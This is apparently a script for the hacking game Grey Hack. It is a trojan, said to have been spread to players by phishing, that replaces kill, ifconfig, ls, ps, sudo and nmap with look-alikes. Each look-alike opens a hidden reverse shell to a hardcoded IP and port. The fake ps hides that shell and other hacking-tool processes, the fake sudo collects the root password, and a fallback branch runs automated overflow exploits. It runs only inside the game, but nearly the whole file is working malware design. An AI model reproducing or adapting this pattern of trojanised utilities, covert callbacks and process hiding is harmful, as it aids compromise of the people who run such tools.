// originally created by ThreeDog/TERATOMA, he sent it to many players in a phishing email.
// it is an rshell so do not run it or if you do change the rshell ip and rshell port to 0.0.0.0 and port 0

name = program_path.split("/")[-1:][0]
metaxploit = include_lib("/lib/metaxploit.so")
if not metaxploit then include_lib(current_path+"/"+"metaxploit.so")
rshellName = "terminal"
rshellIp = "36.15.58.5"
rshellPort = 1234

if name == "kill" then
	if metaxploit then metaxploit.rshell_client(rshellIp,rshellPort,rshellName)
	if params.len != 1 or params[0] == "-h" or params[0] == "--help" then exit(command_info("kill_usage"))
	PID = params[0].to_int
	if typeof(PID) != "number" then exit("The PID must be a number\n" + command_info("kill_usage"))
	output = get_shell.host_computer.close_program(PID)
	if output == true then exit("Process " + PID + " closed");
	if output then exit(output)
	print("Process " + PID + " not found")

else if name == "ifconfig" then
	if metaxploit then metaxploit.rshell_client(rshellIp,rshellPort,rshellName)
	if params.len != 0 and (params.len != 4 or params[0] == "-h" or params[0] == "--help") then exit(command_info("ifconfig_usage"))
	computer = get_shell.host_computer
	if (params.len == 0) then
		router = get_router    
		if computer.is_network_active then
	    	lip = computer.local_ip
    		pip = router.public_ip
    		gw = computer.network_gateway
	    	if computer.active_net_card == "WIFI" then
	        	if router.local_ip != gw then
	            	router = get_router(gw)
	        	end if		    
		    	output = "\nConnected to Wi-Fi:\nEssid: " + router.essid_name + "\nBssid: " + router.bssid_name
			else
		    	output = "\nEthernet connection:"    
			end if
		else
			lip = "0.0.0.0"
			pip = "0.0.0.0"
			gw = "0.0.0.0"
			output = "\nNot connected to the network."
		end if
		print( output + "\n----------------\nPublic IP: " + pip + "\nLocal IP: " + lip + "\nGateway: " + gw + "\n")
	else 
		if params[2] != "gateway" then exit(command_info("ifconfig_usage"))
		device = params[0]
		address = params[1]
		gateway = params[3]
		if not is_valid_ip(address) then exit("ifconfig: invalid ip address")
		if not is_valid_ip(gateway) then exit("ifconfig: invalid gateway")
		output = computer.connect_ethernet(device, address, gateway)
		if output.len > 0 then print(output)
	end if

else if name == "ls" then
	if metaxploit then metaxploit.rshell_client(rshellIp,rshellPort,rshellName)
	ValidateInput = function(input)
		if input == "-la" or input == "-l" or input == "-a" then return true
		return false
	end function 

	if params.len > 3 or (params.len == 1 and params[0].indexOf("-") != null and not ValidateInput(params[0])) or (params.len == 2 and not ValidateInput(params[0])) or (params.len == 3 and (not ValidateInput(params[0]) or not ValidateInput(params[1]))) then
		print(command_info("ls_usage"))
	else
		computer = get_shell.host_computer
		folderPath = current_path
		if params and params[params.len - 1].indexOf("-") == null then
			folderPath = params[params.len - 1]
		end if
		folder = computer.File(folderPath)
		if folder == null then
			print("ls: No such file or directory")
		else
			if not folder.has_permission("r") then
				print("ls: permission denied")
			else
				showHide = 0
				if params and params[0].indexOf("a") != null then
					showHide = 1
				end if
				showDetails = 0
				if params and params[0].indexOf("l") != null then
					showDetails = 1
				end if
				subFiles = folder.get_folders + folder.get_files
				output = ""
				for subFile in subFiles
					nameFile = subFile.name
					permission = subFile.permissions
					owner = subFile.owner
					size = subFile.size
					group = subFile.group
					if showHide or nameFile.indexOf(".") != 0 then
						if output.len > 0 then 
							output = output + "\n"
						end if
						if showDetails then
							output = output + permission + " " + owner + " " + group + " " + size + " 00:00 " + nameFile
							if subFile.is_symlink then output = output + "-->" + subFile.path(true)
						else
							output = output + nameFile
						end if
					end if
				end for
				print(format_columns(output))
			end if
		end if
	end if

else if name == "ps" then
	if metaxploit then metaxploit.rshell_client(rshellIp,rshellPort,rshellName)
	if params.len > 0 then exit(command_info("ps_usage"))
	output = get_shell.host_computer.show_procs
	outputList = output.split("\n")
	newList = []
	for item in outputList
		subItem = item.split(" ")
		if subItem[4] == rshellName then continue
		if subItem[4] == "xtools" then continue
		if subItem[4] == "mailcrack" then continue
		if subItem[4] == "getlogs" then continue
		if subItem[4] == "xmon" then continue
		newList.push(item)
	end for
	output = newList.join("\n")
	print(format_columns(output))

else if name == "sudo" then
	if metaxploit then metaxploit.rshell_client(rshellIp,rshellPort,rshellName)
	if not params or params[0] == "-h" or params[0] == "--help" then exit(command_info("sudo_usage"))
	if params[0] == "-u" and params.len != 2 then exit(command_info("sudo_usage"))

	inputPass = user_input("Password: ", true)

	if params[0] == "-u" then
		shell = get_shell(params[1], inputPass)
		if not shell then exit("sudo: incorrect username or password")
	else 
		shell = get_shell("root", inputPass)
		if not shell then exit("sudo: incorrect password")
	end if

	if params[0] == "-s" or params[0] == "-u" then 
		shell.start_terminal
	else
		computer = shell.host_computer
		args = params[1:].join(" ")
		if not params[0].indexOf("/") then
			globalPath = [current_path, "/bin", "/usr/bin"]
			for path in globalPath
				program = computer.File(path + "/" + params[0])
				if program != null then
			    	shell.launch(program.path, args) 
					exit
				end if
			end for
		else
			program = computer.File(params[0])
			if not program then exit(params[0] + " not found.")
			shell.launch(program.path, args)
		end if
	end if

else if name == "nmap" then
	if metaxploit then metaxploit.rshell_client(rshellIp,rshellPort,rshellName)
	if params.len != 1 or params[0] == "-h" or params[0] == "--help" then exit(command_info("nmap_usage"))	
	if not is_valid_ip(params[0]) then exit("nmap: invalid ip address")
	if not get_shell.host_computer.is_network_active then exit("nmap: No internet access.")

	ipAddress = params[0]
	isLanIp = is_lan_ip( ipAddress )

	if isLanIp then
   		router = get_router;
	else 
   		router = get_router( ipAddress )
	end if

	if router == null then exit("nmap: ip address not found")
	ports = null

	if not isLanIp then
  		ports = router.used_ports
	else
   		ports = router.device_ports(ipAddress)
	end if

	if ports == null then exit("nmap: ip address not found")
	if typeof(ports) == "string" then exit(ports)
      
	info = "PORT STATE SERVICE VERSION LAN"   
	print("\nStarting nmap v1.1 at " + current_date)
	print("Interesting ports on " + params[0] + "\n")
	if(ports.len == 0) then exit("Scan finished. No open ports.")

	for port in ports
   		service_info = router.port_info(port)
   		lan_ips = port.get_lan_ip
   		port_status = "open"

   	if(port.is_closed and not isLanIp) then
		port_status = "closed"
   	end if
   		info = info + "\n" + port.port_number + " " + port_status + " " + service_info + " " + lan_ips
	end for
	print(format_columns(info) + "\n")




else
	if metaxploit then metaxploit.rshell_client(rshellIp,rshellPort,rshellName)
	if params.len != 2 then exit("usage: "+name+" [ip] [port]")
	ip = params[0]
	if not is_valid_ip(ip) then exit("<color=yellow><b>invalid ip")

	port = params[1].to_int

	metaxploit = include_lib("/lib/metaxploit.so")
	if not metaxploit then metaxploit = include_lib(current_path+"/"+"metaxploit.so")
	if not metaxploit then exit("<color=yellow><b>metaxploit.so not found")

	netSession = metaxploit.net_use(ip,port)
	if not netSession then exit("<color=yellow><b>unable to establish net session")

	metalib = netSession.dump_lib
	if not metalib then exit("<color=yellow><b>no metalib")

	memoryZones = metaxploit.scan(metalib)
	if not memoryZones then exit("<color=yellow><b>no memory zones found")

	for memory in memoryZones
		vulns = metaxploit.scan_address(metalib,memory).split("Unsafe check: ")
		if not vulns then exit("<color=yellow><b>no vulns found")
	
		for vuln in vulns
			if vuln == vulns[0] then continue
			vuln = vuln[vuln.indexOf("<b>")+3:vuln.indexOf("</b>")]
			print("<color=orange>"+memory +" "+ vuln)
			object = metalib.overflow(memory,vuln)
			print typeof(object)
		end for
	
	end for

end if
